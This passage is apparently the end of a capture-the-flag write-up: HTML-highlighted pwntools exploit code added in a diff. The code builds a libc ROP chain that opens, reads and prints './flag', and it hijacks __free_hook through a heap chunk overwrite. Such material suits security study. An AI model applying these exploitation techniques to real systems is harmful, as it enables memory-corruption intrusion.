+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'open'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdx; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">rax_addr</span> <span class="o">-</span> <span class="n">payload_addr</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">rax_addr</span> <span class="o">-</span> <span class="n">payload_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'b'</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'leave; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"./flag</span><span class="se">\x00</span><span class="s2">"</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'c'</span> <span class="o">*</span> <span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
